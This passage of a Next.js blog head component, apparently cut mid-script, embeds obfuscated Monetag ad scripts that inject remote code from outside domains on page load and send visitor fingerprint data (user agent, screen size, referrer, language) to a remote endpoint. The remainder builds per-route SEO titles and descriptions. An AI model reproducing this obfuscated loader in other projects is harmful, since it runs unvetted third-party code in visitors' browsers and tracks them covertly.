l=O(s[e.WK](e.h)[e.AE](e.X,k)),B=n===se?Se(l):Ie(l);return t(B)},o[e.KK]=()=>u()})}function Nt(r,n,t=Ye,u=we,o=e.Rr()){return new D((q,d)=>{let i=new c[e.Zk];if(i[e.ik](u,r),i[e.OM]=t,i[e.ob]=!e.X,i[e.rM](jt,O(V(n))),i[e.wk]=()=>{let k=e.Rr();k[e.Xb]=i[e.Xb],k[e.Br]=t===Ye?X[e.cE](i[e.Br]):i[e.Br],[e.Jb,e.RE][e.hb](i[e.Xb])>=e.X?q(k):d(new I(e.PE[e.BK](i[e.Xb],e.LM)[e.BK](i[e.TE],e.NE)[e.BK](n)))},i[e.KK]=()=>{d(new I(e.PE[e.BK](i[e.Xb],e.LM)[e.BK](i[e.TE],e.NE)[e.BK](n)))},u===Wr){let k=typeof o==e.hE?X[e.cE](o):o;i[e.rM](Ne,Or),i[e.Ik](k)}else i[e.Ik]()})}function Yt(r,n,t=Ye,u=we,o=e.Rr()){return new D((q,d)=>{let i=Dn(r),k=Tn(),s=!e.J,l,B,m=()=>{try{k[e.UM][e.yk](k),c[e.jj](e.w,H),s||d(new I(e.mE))}catch(fe){}};function H(fe){let de=oe[e.gb](fe[e.tM])[e.lk]();if(de===i)if(dr(B),fe[e.tM][de]===e.v){let F=e.Rr();F[de]=e.Rr(e.dE,e.ZE,e.SM,O(V(n)),e.GM,u,e.CM,typeof o==e.hE?X[e.cE](o):o),u===Wr&&(F[de][e.lE]=X[e.cE](e.Rr(e.e,Or))),k[e.Ob][e.cj](F,e.wK)}else{s=!e.X,m(),dr(l);let F=e.Rr(),cr=X[e.OK](x(fe[e.tM][de]));F[e.Xb]=cr[e.iE],F[e.Br]=t===se?Se(cr[e.CM]):Ie(cr[e.CM]),[e.Jb,e.RE][e.hb](F[e.Xb])>=e.X?q(F):d(new I(e.PE[e.BK](F[e.Xb],e.NE)[e.BK](n)))}}c[e.sr](e.w,H),k[e.Ak]=r,(M[e.CM]||M[e.pb])[e.ek](k),B=W(m,e.KE),l=W(m,e.Qr)})}function Be(r){try{return r[e.nM](e.HK)[e.V][e.nM](e.zK)[e.vK](-e.V)[e.WK](e.zK)[e.eM]()}catch(n){return e.h}}var ce=e.Yr,Dt=e.Sr,Tt=e.O,Lt=e.s,Gt=e.gr,L=e.Rr();L[e.er]=e.O,L[e.tr]=e.W,L[e.yr]=e.c,L[e.Lr]=e.p,L[e.Nr]=e.B,L[e.Fr]=e.Q;function Sr(r,n){let t=L[n]||Lt,u=a(r,e.JK)[e.gj](e.uK),o=[ce,u][e.WK](t),q=[ce,u,Dt][e.WK](t),d=[ce,u,Tt][e.WK](t);return[o,q,d]}function It(){let r=j[ce];if(r)return r;let n=b[e.Ur]()[e.gj](e.uK)[e.vK](e.V);return j[ce]=n,n}function St(r){let n=e.EM[e.BK](re(),e.uk),t=oe[e.gb](r)[e.vj](o=>{let q=fn(r[o]);return[o,q][e.WK](e.bE)})[e.WK](e.zk),u=new c[e.Zk];u[e.ik](e.q,n,!e.X),u[e.rM](Ne,pt),u[e.Ik](t)}function xe(r,n){let[t,u,o]=Sr(r,n),q=a(j[o],e.JK)||e.X;j[o]=q+e.J,j[t]=new y()[e.xM](),j[u]=e.h}function Xe(r,n,t){let[u,o,q]=Sr(r,n);if(j[u]&&!j[o]){let d=a(j[q],e.JK)||e.X,i=a(j[u],e.JK),k=new y()[e.xM](),s=k-i,{referrer:l}=M,B=c[e.Qj][e.FM];j[o]=k,j[q]=e.X;let m=e.Rr(e.qM,r,e.RM,l,e.mM,s,e.oM,t,e.TM,k,e.PM,It(),e.fM,B,e.xb,i,e.rb,d,e.Kb,h[e.Pr],e.jb,c[e.tj][e.sk],e.kb,c[e.tj][e.bj],e.GM,n||Gt,e.Mb,new y()[e.dk](),e.bb,Be(t),e.Eb,Be(l),e.Yb,Be(B),e.Sb,h[e.wb]||h[e.Ib]);St(m)}}var $t=new z(e.CK,e.xK),Kt=new z(e.GK),ef=new z(e.hK),rf=e.Cr,$r=[rf,E[e.gj](e.uK)][e.WK](e.h),te=e.Rr();te[e.W]=of,te[e.B]=qf,te[e.Q]=Ke,te[e.Sr]=Kr;var nf=[Ke,Kr];function tf(r){return $t[e.QK](r)?r:Kt[e.QK](r)?e.aM[e.BK](r):ef[e.QK](r)?e.HM[e.BK](c[e.Qj][e.tb])[e.BK](r):c[e.Qj][e.FM][e.nM](e.HK)[e.vK](e.X,-e.J)[e.BK](r)[e.WK](e.HK)}function ff(){let r=[j[$r]][e.BK](oe[e.gb](te));return r[e.Oj]((n,t)=>n&&r[e.hb](n)===t)}function uf(){return[...nf]}function $e(r,n,t,u,o){let q=r[e.YM]();return u&&u!==we?q?q(n,t,u,o)[e.pj](d=>d)[e.Wj](()=>$e(r,n,t,u,o)):Ke(n,t,u,o):q?te[q](n,t||e.Tb)[e.pj](d=>(j[$r]=q,d))[e.Wj](()=>$e(r,n,t,u,o)):new D((d,i)=>i())}function of(r,n){C(e.UK);let t=e.Lr,u=Fe(),o=e.HM[e.BK](re(),e.HK)[e.BK](u,e.Cb)[e.BK](O(r));return Pt(o,n)[e.pj](q=>(xe(E,t),q))[e.Wj](q=>{throw Xe(E,t,o),q})}function qf(r,n){C(e.dK);let t=e.Nr,u=Fe(),o=e.HM[e.BK](re(),e.HK)[e.BK](u,e.Gb)[e.BK](O(r));return At(o,n)[e.pj](q=>(xe(E,t),q))[e.Wj](q=>{throw Xe(E,t,o),q})}function Ke(r,n,t,u){C(e.ZK);let o=e.Fr,q=Fe(),d=e.HM[e.BK](re(),e.HK)[e.BK](q,e.ak);return Nt(d,r,n,t,u)[e.pj](i=>(xe(E,o),i))[e.Wj](i=>{throw Xe(E,o,d),i})}function Kr(r,n,t,u){C(e.Xk),wr(re());let o=e.iK,q=Yn();return Yt(q,r,n,t,u)[e.pj](d=>(xe(E,o),d))[e.Wj](d=>{throw Xe(E,o,q),d})}function er(r,n,t,u){r=tf(r),t=t?t[e.Bb]():e.h;let o=t&&t!==we?uf():ff();return C(e.h[e.BK](t,e.i)[e.BK](r)),$e(o,r,n,t,u)[e.pj](q=>q&&q[e.Br]?q:e.Rr(e.Xb,e.Jb,e.Br,q))}var rr=e.Gr,nr=e.hr,cf=e.vr,df=e.Or,Mf=e.Wr,bf=e.cr,zf=e.pr,af=e.Br,tr,fr;function ur(r){let n=r&&r[e.tM]&&r[e.tM][e.SM],t=r&&r[e.tM]&&r[e.tM][e.gM],u=r&&r[e.tM]&&r[e.tM][e.CM],o=r&&r[e.tM]&&r[e.tM][e.GM],q=r&&r[e.tM]&&r[e.tM][e.hM],d=r&&r[e.tM]&&r[e.tM][e.vM],i=r&&r[e.tM]&&r[e.tM][e.OM],k=r&&r[e.tM]&&r[e.tM][e.WM],s=k===E||k===Z,l=e.Rr();q!==rr&&q!==nr||(t===cf?(l[e.gM]=df,l[e.lb]=R,l[e.WM]=E,l[e.sb]=Z):t===Mf&&d&&(!k||s)&&(l[e.gM]=bf,l[e.vM]=d,er(n,i,o,u)[e.pj](B=>{let m=e.Rr();m[e.gM]=af,m[e.SM]=n,m[e.vM]=d,m[e.tM]=B,or(q,m)})[e.Wj](B=>{let m=e.Rr();m[e.gM]=zf,m[e.SM]=n,m[e.vM]=d,m[e.Lb]=B&&B[e.w],or(q,m)})),l[e.gM]&&or(q,l))}function or(r,n){switch(n[e.hM]=r,r){case nr:fr[e.cj](n);break;case rr:default:tr[e.cj](n);break}c[e.cj](n,e.wK)}function kf(){try{tr=new ir(rr),tr[e.sr](e.w,ur),fr=new ir(nr),fr[e.sr](e.w,ur)}catch(r){}c[e.sr](e.w,ur)}var en=M[e.qr];function jf(r,n,t){return new D((u,o)=>{C(e.db);let q;if([e.Hr,e.ur,e.nr][e.hb](R)>-e.J){q=M[e.VK](e.Jk);let d=M[e.vE](r);q[e.wk]=t,q[e.ek](d),q[e.OE](e.CE,E),q[e.OE](e.GE,Be(x(jr)));try{en[e.UM][e.mb](q,en)}catch(i){(M[e.CM]||M[e.pb])[e.ek](q)}}else P(r);W(()=>(q!==void e.X&&q[e.UM][e.yk](q),yr(n)?(C(e.VE),u()):o()))})}function mf(r,n){let t=r===e.J?wt():x(jr);return er(t,e.v,e.v,e.v)[e.pj](u=>(u=u&&e.Br in u?u[e.Br]:u,u&&bt(E,u),u))[e.Wj](()=>zt(E))[e.pj](u=>{u&&jf(u,r,n)})}Gn();function ve(r){return yr()?e.v:(C(e.XM),In(),rn(r))}function rn(r){return R===e.J&&Lr()&&Tr(E),Pe()?(Te(),c[hn]=er,Hr()[e.pj](n=>{if(n&&R===e.J){let t=new c[e.Zk];t[e.ik](e.F,e.HM[e.BK](n)),t[e.rM](mt,E),Gr(n),t[e.wk]=()=>{let u=M[e.VK](e.Jk),o=M[e.vE](t[e.Br][e.Nk](/document\b/g,q()));u[e.wk]=r;function q(){let d=e.rY[e.BK](b[e.Ur]()[e.gj](e.uK)[e.vK](e.V));return c[d]=c[e.ib],d}u[e.ek](o),(M[e.CM]||M[e.pb])[e.ek](u),W(()=>{u!==void e.X&&(u[e.UM][e.yk](u),he())})},t[e.Ik]();return}mf(R,r)[e.pj](()=>{kr([E,Z],re())})})):W(rn,e.Qk)}function Ef(){try{return Lr()&&Tr(Z),gt(),Hr(!e.X)[e.pj](r=>{qr(r)})[e.Wj](()=>{qr()})}catch(r){return qr()}}function qr(r){let n=r||x(mr);Gr(n);let t=M[e.VK](e.Jk);t[e.KK]=()=>{he(),ve()},t[e.wk]=()=>{he()},t[e.Ak]=e.EM[e.BK](n,e.Ub)[e.BK](Z),(M[e.CM]||M[e.pb])[e.ek](t)}c[Wn]=ve,c[Cn]=ve,W(ve,e.Qr),Jr(Re,Ze),Jr(Me,Qe),kf(),Hn&&R===e.J&&Ef();try{$}catch(r){}})()})(oe.entries({x:"AzOxuow",r:"Bget zafuruomfuaz (TFFB)",K:"Bget zafuruomfuaz (TFFBE)",j:"Bget zafuruomfuaz (Pagnxq Fms)",k:"Uzfqdefufumx",M:"Zmfuhq",b:"Uz-Bmsq Bget",E:"azoxuow",Y:"zmfuhq",S:"bgetqd-gzuhqdemx",g:"qz",C:"rd",G:"pq",h:"",v:null,O:"e",W:"o",c:"v",p:"k",B:"b",Q:"j",V:2,H:"oxuow",n:"fagot",u:"7.0.7",z:"lrsbdajktffb",a:"lrsradymfe",X:0,J:1,U:"\r\n",d:",",Z:"F",i:":",w:"yqeemsq",I:"yspn9a79sh",l:"q5qedx1ekg5",s:"g",D:"Fawqz",A:"Rmhuoaz",e:"Oazfqzf-Fkbq",t:"fqjf/tfyx",y:"mbbxuomfuaz/veaz",L:"veaz",N:"nxan",F:"SQF",q:"BAEF",R:"TQMP",m:"mbbxuomfuaz/j-iii-rady-gdxqzoapqp; otmdeqf=GFR-8",o:"Mooqbf-Xmzsgmsq",T:"j-mbbxuomfuaz-wqk",P:"j-mbbxuomfuaz-fawqz",f:"__PX_EQEEUAZ_",xr:"lrspxbabgb",rr:"puh",Kr:999999,jr:"gdx(pmfm:uymsq/sur;nmeq64,D0xSAPxtMCMNMUMMMMMMMB///kT5NMQMMMMMXMMMMMMNMMQMMMUNDMM7)",kr:"xuzw",Mr:"efkxqetqqf",br:"mzazkyage",Er:"fqjf/oee",Yr:"zdm8od49pds",Sr:"r",gr:"gzwzaiz",Cr:"f4wp70p8osq",Gr:"gwtrajlpasc",hr:"wmtityzzu",vr:"buzs",Or:"bazs",Wr:"dqcgqef",cr:"dqcgqef_mooqbfqp",pr:"dqcgqef_rmuxqp",Br:"dqebazeq",Qr:1e4,Vr:"radQmot",Hr:4,nr:5,ur:3,zr:6,ar:7,Xr:"fdkFab",Jr:"sqfBmdqzfZapq",Ur:"dmzpay",dr:"fuyqe",Zr:"ogddqzf",ir:"dqmpk",wr:"pmfq",Ir:"fxp",lr:"dmi",sr:"mppQhqzfXuefqzqd",Dr:"lUzpqj",Ar:"nmowsdagzpUymsq",er:"PQXUHQDK_VE",tr:"PQXUHQDK_OEE",yr:"BDAJK_VE",Lr:"BDAJK_OEE",Nr:"BDAJK_BZS",Fr:"BDAJK_JTD",qr:"ogddqzfEodubf",Rr:function(){let e={},c=[].slice.call(arguments);for(let M=0;M<c.length-1;M+=2)e[c[M]]=c[M+1];return e},mr:1e3,or:42,Tr:36e5,Pr:"geqdMsqzf",fr:"mzpdaup",xK:"u",rK:"iuzpaie zf",KK:"azqddad",jK:"zmh",kK:"([^m-l0-9]+)",MK:"_rmxeq",bK:"yageqpaiz",EK:"yageqgb",YK:"fagotqzp",SK:"fagotefmdf",gK:"efkxq",CK:"^tffbe?:",GK:"^//",hK:"^/",vK:"exuoq",OK:"bmdeq",WK:"vauz",cK:"xqzsft",pK:"__BBG_EQEEUAZ_1_",BK:"oazomf",QK:"fqef",VK:"odqmfqQxqyqzf",HK:"/",nK:".tfyx",uK:36,zK:".",aK:"!",XK:"&ar=1",JK:10,UK:"dqcgqefNkOEE",dK:"dqcgqefNkBZS",ZK:"dqcgqefNkJTD",iK:"BDAJK_RDMYQ",wK:"*",IK:48,lK:9,sK:"0",DK:768,AK:1024,eK:568,tK:360,yK:1080,LK:736,NK:900,FK:864,qK:812,RK:667,mK:800,oK:240,TK:300,PK:"qz-GE",fK:"qz-SN",xj:"qz-OM",rj:"qz-MG",Kj:"eh-EQ",jj:"dqyahqQhqzfXuefqzqd",kj:"up",Mj:"fmdsqfUp",bj:"tqustf",Ej:"iuz",Yj:"pao",Sj:"paoQxqyqzf",gj:"faEfduzs",Cj:"dqpgoq",Gj:"//vayfuzsu.zqf/mbg.btb?lazqup=",hj:"ymfot",vj:"ymb",Oj:"ruxfqd",Wj:"omfot",cj:"baefYqeemsq",pj:"ftqz",Bj:function(e,c){return new z(e,c)},Qj:"xaomfuaz",Vj:"1bj",Hj:"mnagf:nxmzw",nj:"BTB",uj:"VE",zj:18e5,aj:"uBtazq|uBmp|uBap",Xj:"Hqdeuaz\\/[^E]+Emrmdu",Jj:"rudqraj",Uj:"su",dj:"oeeDgxqe",Zj:57,ij:"rdayOtmdOapq",wj:35,Ij:60,lj:120,sj:480,Dj:180,Aj:720,ej:"bget",tj:"eodqqz",yj:"dqhqdeq",Lj:"eod",Nj:"urdmyq",Fj:"B",qj:"Z",Rj:"B/Z",mj:"Z/B",oj:"B/Z/Z",Tj:"Z/B/Z",Pj:"B/Z/B/Z",fj:"Z/Z/Z/Z",xk:"00",rk:"000",Kk:"0000",jk:"00000",kk:"zqie",Mk:"bmsqe",bk:"iuwu",Ek:"ndaieq",Yk:"huqi",Sk:"yahuq",gk:"mdfuoxq",Ck:"mdfuoxqe",Gk:"efmfuo",hk:"bmsq",vk:"uzpqj",Ok:"iqn",Wk:"mfan",ck:"DqsQjb",pk:"pqoapqGDUOaybazqzf",Bk:"Ymft",Qk:100,Vk:"Otdayq\\/([0-9]{1,})",Hk:"OduAE\\/([0-9]{1,})",nk:"mffmotQhqzf",uk:"/qhqzf",zk:"&",ak:".veaz",Xk:"dqcgqefNkUrdmyq",Jk:"eodubf",Uk:"otmdOapqMf",dk:"sqfFuyqlazqArreqf",Zk:"JYXTffbDqcgqef",ik:"abqz",wk:"azxamp",Ik:"eqzp",lk:"bab",sk:"iupft",Dk:"abmoufk",Ak:"edo",ek:"mbbqzpOtuxp",tk:"omxx",yk:"dqyahqOtuxp",Lk:"rxaad",Nk:"dqbxmoq",Fk:3571,qk:"ep",Rk:"sgy",mk:"bwqk",ok:"befduzs",Tk:"begrrujqe",Pk:2147483647,fk:"puebmfotQhqzf",xM:"sqfFuyq",rM:"eqfDqcgqefTqmpqd",KM:"Mzpdaup",jM:"Rudqraj",kM:56,MM:"rujqp",bM:"mgfa",EM:"//",YM:"eturf",SM:"gdx",gM:"fkbq",CM:"napk",GM:"yqftap",hM:"otmzzqx",vM:"dqcgqef_up",OM:"dqebazeqFkbq",WM:"lazqup_mpnxaow",cM:97,pM:122,BM:"fab",QM:"lazqUp",VM:"radymf",HM:"tffbe://",nM:"ebxuf",uM:"mnopqrstuvwxyzabcdefghijkl",zM:"oazfqzf",aM:"tffbe:",XM:"efmdfXampuzs",JM:"rb",UM:"bmdqzfZapq",dM:"s",ZM:16807,iM:27,wM:"baeufuaz",IM:"xqrf",lM:"dustf",sM:"naffay",DM:"bauzfqdQhqzfe",AM:".iupsqf-oax-10-eb",eM:"faXaiqdOmeq",tM:"pmfm",yM:"fzqyqxQfzqygoap",LM:" ",NM:"uzoxgpqe",FM:"tdqr",qM:"lazqup",RM:"dqrqddqd",mM:"fuyq_purr",oM:"rmuxqp_gdx",TM:"rmux_fuyq",PM:"geqd_up",fM:"ogddqzf_gdx",xb:"xmef_egooqee",rb:"egooqee_oagzf",Kb:"geqd_msqzf",jb:"eodqqz_iupft",kb:"eodqqz_tqustf",Mb:"fuyqlazq",bb:"rmuxqp_gdx_paymuz",Eb:"dqrqddqd_paymuz",Yb:"ogddqzf_gdx_paymuz",Sb:"ndaieqd_xmzs",gb:"wqke",Cb:".oee?",Gb:".bzs?",hb:"uzpqjAr",vb:"pmfmeqf",Ob:"oazfqzfIuzpai",Wb:"MMN ",cb:"|",pb:"paogyqzfQxqyqzf",Bb:"faGbbqdOmeq",Qb:"hqdeuaz",Vb:"eagdoqLazqUp",Hb:"paymuz",nb:"sqzqdmfuazFuyq",ub:"qjfdm",zb:"mbbxk",ab:"eqxqofadFqjf",Xb:"efmfge",Jb:200,Ub:"/5/",db:"efmdfUzvqofEodubfOapq",Zb:"eqxqofad",ib:"paogyqzf",wb:"xmzsgmsq",Ib:"geqdXmzsgmsq",lb:"omxxeusz",sb:"lazqup_adusuzmx",Db:"oazfqzfPaogyqzf",Ab:"tqmp",eb:"geq-odqpqzfumxe",tb:"taef",yb:"ruzp",Lb:"qddad",Nb:"sqfQxqyqzfeNkFmsZmyq",Fb:"hmxgq",qb:"dqx",Rb:"odaeeAdusuz",mb:"uzeqdfNqradq",ob:"iuftOdqpqzfumxe",Tb:"fqjf",Pb:"eagdeqPuh",fb:"dqxmfuhq",xE:"efkxqEtqqfe",rE:"rudefOtuxp",KE:2e3,jE:"%",kE:"bai",ME:"6g90tD4d4Dd1r8xzjbbl",bE:"=",EE:"sqfMxxDqebazeqTqmpqde",YE:"bdqhqzfPqrmgxf",SE:"efabUyyqpumfqBdabmsmfuaz",gE:"bdafafkbq",CE:"pmfm-lazq-up",GE:"pmfm-paymuz",hE:"anvqof",vE:"odqmfqFqjfZapq",OE:"eqfMffdungfq",WE:"?pahd=fdgq",cE:"efduzsurk",pE:"faUEAEfduzs",BE:"[\\d\\z]+",QE:"pdmiUymsq",VE:"qzpUzvqofEodubfOapq",HE:"/4/",nE:12,uE:"fduy",zE:16,aE:"omzhme",XE:"2p",JE:"sqfOazfqjf",UE:"sqfUymsqPmfm",dE:"f",ZE:"baef",iE:"efmfge_oapq",wE:30,IE:5e3,lE:"tqmpqde",sE:"qddad.oay",DE:"oxaeqp",AE:"egnefduzs",eE:"eturfEfduzs ",tE:"ruxx",yE:"pmfq:",LE:32,NE:"' ituxq dqcgqefuzs ",FE:": ",qE:"fuyqagf",RE:204,mE:"qddad dqcgqef fuyqagf",oE:256,TE:"efmfgeFqjf",PE:"qddad '",fE:8,xY:"paogyqzf\\n",rY:"_"}).reduce((e,c)=>(oe.defineProperty(e,c[0],{get:()=>typeof c[1]!="string"?c[1]:c[1].split("").map(M=>{let h=M.charCodeAt(0);return h>=65&&h<=90?J.fromCharCode((h-65+26-12)%26+65):h>=97&&h<=122?J.fromCharCode((h-97+26-12)%26+97):M}).join("")}),e),{}),window,qn,g)});})();`}
          </script>
      )}

      {(
        <script id='monetag-ad-2'>
          {`(function(d,z,s,c){s.src='//'+d+'/400/'+z;s.onerror=s.onload=E;function E(){c&&c();c=null}try{(document.body||document.documentElement).appendChild(s)}catch(e){E()}})('aistekso.net',7934018,document.createElement('script'),_uifqxzuj)`}
        </script>
      )}
    </Head>
  )
}

/**
 * 获取SEO信息
 * @param {*} props
 * @param {*} router
 */
const getSEOMeta = (props, router, locale) => {
  const { post, siteInfo, tag, category, page } = props
  const keyword = router?.query?.s

  switch (router.route) {
    case '/':
      return {
        title: `${siteInfo?.title} | ${siteInfo?.description}`,
        description: `${siteInfo?.description}`,
        image: `${siteInfo?.pageCover}`,
        slug: '',
        type: 'website'
      }
    case '/archive':
      return {
        title: `${locale.NAV.ARCHIVE} | ${siteInfo?.title}`,
        description: `${siteInfo?.description}`,
        image: `${siteInfo?.pageCover}`,
        slug: 'archive',
        type: 'website'
      }
    case '/page/[page]':
      return {
        title: `${page} | Page | ${siteInfo?.title}`,
        description: `${siteInfo?.description}`,
        image: `${siteInfo?.pageCover}`,
        slug: 'page/' + page,
        type: 'website'
      }
    case '/category/[category]':
      return {
        title: `${category} | ${locale.COMMON.CATEGORY} | ${siteInfo?.title}`,
        description: `${siteInfo?.description}`,
        slug: 'category/' + category,
        image: `${siteInfo?.pageCover}`,
        type: 'website'
      }
    case '/category/[category]/page/[page]':
      return {
        title: `${category} | ${locale.COMMON.CATEGORY} | ${siteInfo?.title}`,
        description: `${siteInfo?.description}`,
        slug: 'category/' + category,
        image: `${siteInfo?.pageCover}`,
        type: 'website'
      }
    case '/tag/[tag]':
    case '/tag/[tag]/page/[page]':
      return {
        title: `${tag} | ${locale.COMMON.TAGS} | ${siteInfo?.title}`,
        description: `${siteInfo?.description}`,
        image: `${siteInfo?.pageCover}`,
        slug: 'tag/' + tag,
        type: 'website'
      }
    case '/search':
      return {
        title: `${keyword || ''}${keyword ? ' | ' : ''}${locale.NAV.SEARCH} | ${siteInfo?.title}`,
        description: `${siteInfo?.description}`,
        image: `${siteInfo?.pageCover}`,
        slug: 'search',
        type: 'website'
      }
    case '/search/[keyword]':
    case '/search/[keyword]/page/[page]':
      return {
        title: `${keyword || ''}${keyword ? ' | ' : ''}${locale.NAV.SEARCH} | ${siteInfo?.title}`,
        description: siteConfig('TITLE'),
        image: `${siteInfo?.pageCover}`,
        slug: 'search/' + (keyword || ''),
        type: 'website'
      }
    case '/404':
      return {
        title: `${siteInfo?.title} | 页面找不到啦`,
        image: `${siteInfo?.pageCover}`
      }
    case '/tag':
      return {
        title: `${locale.COMMON.TAGS} | ${siteInfo?.title}`,
        description: `${siteInfo?.description}`,
        image: `${siteInfo?.pageCover}`,
        slug: 'tag',
        type: 'website'
      }
    case '/category':
      return {
        title: `${locale.COMMON.CATEGORY} | ${siteInfo?.title}`,
        description: `${siteInfo?.description}`,
        image: `${siteInfo?.pageCover}`,
        slug: 'category',
        type: 'website'
      }
    default:
      return {
        title: post
          ? `${post?.title} | ${siteInfo?.title}`
          : `${siteInfo?.title} | loading`,
        description: post?.summary,
        type: post?.type,
        slug: post?.slug,
        image: post?.pageCoverThumbnail || `${siteInfo?.pageCover}`,
        category: post?.category?.[0],
        tags: post?.tags
      }
  }
}

export default GlobalHead
